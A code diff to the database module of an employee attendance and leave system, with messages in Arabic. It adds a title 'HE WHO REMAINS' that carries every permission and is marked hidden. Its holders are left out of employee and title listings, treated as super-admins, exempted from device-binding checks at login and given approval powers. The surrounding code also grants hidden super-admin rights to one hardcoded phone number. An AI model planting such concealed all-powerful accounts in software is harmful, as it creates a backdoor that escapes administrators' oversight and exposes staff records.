@@ -98,6 +98,33 @@ const DEFAULT_BRANCHES = [
 
 const DEFAULT_TITLES = [
   {
+    id: "title_he_who_remains",
+    code: "he_who_remains",
+    name: "HE WHO REMAINS",
+    englishTitle: "HE WHO REMAINS",
+    arabicTitle: "HE WHO REMAINS",
+    description: "السلطة الإدارية العليا المطلقة (غير مرئي في النظام)",
+    color: "amber",
+    order: 0,
+    isHidden: true,
+    permissions: {
+      check_in_out: true,
+      view_own_attendance: true,
+      view_office_presence: true,
+      request_leave: true,
+      request_permission: true,
+      approve_leaves_permissions: true,
+      approve_early_checkout: true,
+      manage_employees: true,
+      manage_titles_permissions: true,
+      manage_office_settings: true,
+      view_reports: true,
+      view_all_branches: true,
+      override_early_checkout: true,
+      edit_employee_details: true
+    }
+  },
+  {
     id: "title_memberships_executive_director",
     code: "memberships_executive_director",
     name: "Memberships Executive Director (المدير التنفيذي للعضويات)",
@@ -445,8 +472,12 @@ class Database {
   }
 
   // Titles & Permissions
-  getTitles() {
-    return this.data.titles;
+  getTitles(includeHidden = false) {
+    let list = this.data.titles || [];
+    if (!includeHidden) {
+      list = list.filter(t => !t.isHidden && t.code !== 'he_who_remains');
+    }
+    return list;
   }
 
   updateTitlePermissions(code, permissions) {
@@ -461,7 +492,7 @@ class Database {
   getEmployees(branchId = null, includeGhost = false) {
     let list = this.data.employees;
     if (!includeGhost) {
-      list = list.filter(e => e.phone !== "01010046078" && !e.isGhost && !e.isSuperAdmin);
+      list = list.filter(e => e.phone !== "01010046078" && !e.isGhost && !e.isSuperAdmin && e.titleCode !== 'he_who_remains');
     }
     if (branchId && branchId !== 'all') {
       if (Array.isArray(branchId)) {
@@ -510,7 +541,7 @@ class Database {
     if (!emp) return null;
     const titleObj = this.data.titles.find(t => t.code === emp.titleCode);
     const branchObj = this.data.branches.find(b => b.id === emp.branchId);
-    const isSuper = Boolean(emp.isSuperAdmin || emp.phone === "01010046078");
+    const isSuper = Boolean(emp.isSuperAdmin || emp.phone === "01010046078" || emp.titleCode === "he_who_remains");
     return {
       ...emp,
       isSuperAdmin: isSuper,
@@ -589,7 +620,7 @@ class Database {
       throw new Error("كلمة المرور غير صحيحة.");
     }
 
-    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin);
+    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin || emp.titleCode === "he_who_remains");
 
     // Device binding check (Super Admin can login from any device, no restriction)
     if (!isSuper && deviceContext && deviceContext.deviceId) {
@@ -666,7 +697,7 @@ class Database {
 
   loginEmployeeByPasskey(emp, deviceContext = null) {
     const cleanPhone = emp.phone ? emp.phone.trim() : '';
-    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin);
+    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin || emp.titleCode === "he_who_remains");
 
     if (!isSuper && deviceContext && deviceContext.deviceId) {
       if (!emp.boundDeviceId) {
@@ -1341,7 +1372,7 @@ class Database {
       if (requesterTitle === 'memberships_area_manager') {
         // Area Manager's requests go directly to Memberships Executive Director
         managerTargetIds = this.data.employees
-          .filter(e => e.titleCode === 'memberships_executive_director' || e.phone === '01010046078')
+          .filter(e => e.titleCode === 'memberships_executive_director' || e.titleCode === 'he_who_remains' || e.phone === '01010046078')
           .map(e => e.id);
       } else if (['memberships_manager', 'memberships_section_head', 'memberships_deputy_manager'].includes(requesterTitle)) {
         // Branch leadership requests go directly to their Sector's Area Manager
@@ -1385,7 +1416,7 @@ class Database {
             managerTargetIds = areaManagers.map(e => e.id);
           } else {
             managerTargetIds = this.data.employees
-              .filter(e => e.titleCode === 'memberships_executive_director' || e.phone === '01010046078')
+              .filter(e => e.titleCode === 'memberships_executive_director' || e.titleCode === 'he_who_remains' || e.phone === '01010046078')
               .map(e => e.id);
           }
         }
@@ -1418,7 +1449,7 @@ class Database {
     const reviewer = this.data.employees.find(e => e.id === reviewerId);
 
     if (req.type === 'early_checkout') {
-      const canApproveEarly = ['memberships_manager', 'memberships_area_manager', 'memberships_executive_director'].includes(reviewer?.titleCode);
+      const canApproveEarly = ['he_who_remains', 'memberships_manager', 'memberships_area_manager', 'memberships_executive_director'].includes(reviewer?.titleCode) || Boolean(reviewer?.isSuperAdmin);
       if (!canApproveEarly) {
         throw new Error("عفواً، اعتماد طلبات الانصراف الطارئ صلاحية حصرية لمدير العضويات (Memberships Manager) والإدارة العليا.");
       }
